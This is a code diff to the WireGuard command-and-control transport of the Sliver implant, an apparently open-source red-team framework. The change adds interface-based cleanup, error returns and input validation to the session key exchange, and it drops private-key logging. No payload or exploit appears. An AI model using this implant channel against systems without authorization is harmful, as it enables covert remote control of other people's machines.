@@ -28,6 +28,7 @@ import (
 	"crypto/ed25519"
 	"crypto/sha256"
 	"encoding/binary"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -47,7 +48,6 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/netstack"
 	"golang.org/x/crypto/blake2b"
-	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 	"golang.zx2c4.com/wireguard/tun"
 	"google.golang.org/protobuf/proto"
@@ -251,12 +251,35 @@ func formatWGEndpoint(address string, port uint16) string {
 	return net.JoinHostPort(address, strconv.Itoa(int(port)))
 }
 
+type permanentDevice interface {
+	Close()
+}
+
+type sessionKeyDevice interface {
+	permanentDevice
+	Up() error
+}
+
+type netDialer interface {
+	Dial(network string, address string) (net.Conn, error)
+}
+
+type deviceConfigurator interface {
+	permanentDevice
+	IpcSetOperation(io.Reader) error
+}
+
 // getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
 func getSessKeys(address string, port uint16) error {
 	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
 	if err != nil {
 		return err
 	}
+	return getSessKeysWithDevice(dev, tNet)
+}
+
+func getSessKeysWithDevice(dev sessionKeyDevice, tNet netDialer) error {
+	defer dev.Close()
 
 	if err := dev.Up(); err != nil {
 		return err
@@ -271,25 +294,17 @@ func getSessKeys(address string, port uint16) error {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
 		// {{end}}
-		_ = dev.Down()
 		return err
 	}
 
-	wgSessPrivKey, wgSessPubKey, tunAddress = doKeyExchange(keyExchangeConnection)
+	wgSessPrivKey, wgSessPubKey, tunAddress, err = doKeyExchange(keyExchangeConnection)
+	if err != nil {
+		return err
+	}
 
 	// {{if .Config.Debug}}
-	log.Printf("Signaling wg device to go down")
+	log.Printf("Closing temporary wg key exchange device")
 	// {{end}}
-
-	// Close initial wireguard connection
-	err = dev.Down()
-
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to close device.Device: %s", err)
-		// {{end}}
-		return err
-	}
 	return nil
 }
 
@@ -309,7 +324,7 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		return nil, nil, err
 	}
 
-	connection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
+	connection, err := dialDevice(tNet, dev, "tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to sliver listener: %v", err)
@@ -324,6 +339,15 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 	failedConn = 0
 	tunnelNet = tNet
 	return connection, dev, nil
+}
+
+func dialDevice(dialer netDialer, dev permanentDevice, network string, address string) (net.Conn, error) {
+	connection, err := dialer.Dial(network, address)
+	if err != nil {
+		dev.Close()
+		return nil, err
+	}
+	return connection, nil
 }
 
 // bringUpWGInterface - First creates an inet.af network stack.
@@ -342,6 +366,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 		// {{if .Config.Debug}}
 		log.Panic(err)
 		// {{end}}
+		return nil, nil, nil, err
 	}
 
 	wgLogLevel := device.LogLevelSilent
@@ -349,7 +374,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	wgLogLevel = device.LogLevelVerbose
 	// {{end}}
 
-	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
+	dev := device.NewDevice(tun, newWGUDPBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
@@ -360,7 +385,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	log.Printf("Configuring wg device with: %s", wgConf.String())
 	// {{end}}
 
-	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
+	if err := configureDevice(dev, bufio.NewReader(wgConf)); err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to set wg device config: %s", err)
 		// {{end}}
@@ -373,29 +398,53 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	return tun, dev, tNet, nil
 }
 
+func configureDevice(dev deviceConfigurator, config io.Reader) error {
+	if err := dev.IpcSetOperation(config); err != nil {
+		dev.Close()
+		return err
+	}
+	return nil
+}
+
 // doKeyExchange - Connect to key exchange listener and retrieve new dynamic wg keys
-func doKeyExchange(conn net.Conn) (string, string, string) {
+func doKeyExchange(conn net.Conn) (string, string, string, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Connected to key exchange listener")
 	// {{end}}
 	defer conn.Close()
 
-	// 129 = 64 byte key + 1 byte delimiter + 64 byte key + 1 byte delimiter + 16 byte ip address
-	buff := make([]byte, 146)
-	buffReader := bufio.NewReader(conn)
-
-	_, err := io.ReadFull(buffReader, buff)
+	const maxMessageSize = 256
+	buff, err := io.ReadAll(io.LimitReader(conn, maxMessageSize+1))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to read wg keys from key exchange listener: %s", err)
 		// {{end}}
+		return "", "", "", fmt.Errorf("read WireGuard key exchange response: %w", err)
+	}
+	if len(buff) > maxMessageSize {
+		return "", "", "", errors.New("WireGuard key exchange response exceeds maximum length")
 	}
 
 	stringSlice := strings.Split(string(buff), "|")
+	if len(stringSlice) != 3 {
+		return "", "", "", fmt.Errorf("invalid WireGuard key exchange response: got %d fields", len(stringSlice))
+	}
+	for index, key := range stringSlice[:2] {
+		if len(key) != 64 {
+			return "", "", "", fmt.Errorf("invalid WireGuard key exchange key %d length", index+1)
+		}
+		if _, err := hex.DecodeString(key); err != nil {
+			return "", "", "", fmt.Errorf("invalid WireGuard key exchange key %d encoding", index+1)
+		}
+	}
+	tunIP, err := netip.ParseAddr(stringSlice[2])
+	if err != nil || !tunIP.Is4() {
+		return "", "", "", fmt.Errorf("invalid WireGuard key exchange tunnel IP %q", stringSlice[2])
+	}
 	// {{if .Config.Debug}}
-	log.Printf("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String())
+	log.Printf("Retrieved new WireGuard session keys for tunnel IP %s", tunIP.String())
 	// {{end}}
-	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
+	return stringSlice[0], stringSlice[1], tunIP.String(), nil
 }
 
 func getWgKeyExchangePort() int {
